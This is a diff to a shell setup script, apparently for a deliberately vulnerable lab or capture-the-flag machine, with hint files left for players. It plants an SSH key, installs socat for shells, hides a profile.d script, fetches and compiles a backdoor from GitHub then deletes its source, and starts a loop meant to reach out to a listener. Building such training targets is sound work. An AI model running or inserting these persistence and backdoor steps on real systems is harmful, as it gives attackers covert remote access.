@@ -42,7 +42,6 @@ echo "$SSH_KEY" >> "$AUTHORIZED_KEYS"
 chmod 600 "$AUTHORIZED_KEYS"
 
 ### Shells
-
 # Install socat
 DEBIAN_FRONTEND=noninteractive apt-get install socat -y
 
@@ -75,6 +74,20 @@ EOF
 
 # Set privs for funny.sh
 chmod +x /etc/profile.d/.funny.sh
+
+### Install and schedule a Backdoor Binary
+#Little Hint
+mkdir /etc/goose
+cat <<EOF > /etc/goose/egg
+You've got the right directory!
+EOF
+
+# Get the code to compile
+sudo curl -s -o /etc/goose/.golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
+
+# Compile and remove source code
+gcc -o golden_egg .golden_egg.c
+rm .golden_egg.c
 
 # Setup Script Shell reach out to listener
 while true; do
